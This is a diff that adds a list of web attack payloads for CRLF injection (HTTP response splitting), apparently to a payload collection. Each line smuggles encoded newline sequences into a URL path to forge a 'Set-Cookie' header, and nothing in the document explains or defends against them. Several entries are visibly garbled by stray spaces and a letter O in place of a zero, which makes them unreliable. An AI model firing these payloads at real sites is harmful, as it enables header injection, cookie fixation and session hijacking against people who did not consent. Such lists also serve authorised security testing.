@@ -1,6 +1,25 @@
 
 More Payloads:
 
+/%%0a0aSet-Cookie:crlf
+/%0aSet-Cookie:crlf
+/%0d%0aSet-Cookie:crlf
+/%0dSet-Cookie:crlf
+/%23%0aSet-Cookie:crlf
+/%23%0d%0aSet-Cookie:crlf
+/%23%0dSet-Cookie:crlf
+/%25%30%6 1 Set-Cookie:crlf
+/%25%30aSet-Cookie:crlf
+/%250aSet-Cookie:crlf
+/%25250aSet-Cookie:crlf
+/%2e% 2e %2f%0d% 0aSet-Cookie:crlf
+/%2f%2e%2e%0d%0aSet-Cookie:crlf
+/%2F. %0 d%OaSet-Cookie:crlf
+/%3f%0d%0aSet-Cookie:crlf
+/%3f%0dSet-Cookie:crlf
+/%u000aSet-Cookie:crlf
+/%E5%98 %8D % E5%9 8%8ASet-Cookie:crlf
+
 %0D%0A
 \r\n
 \n
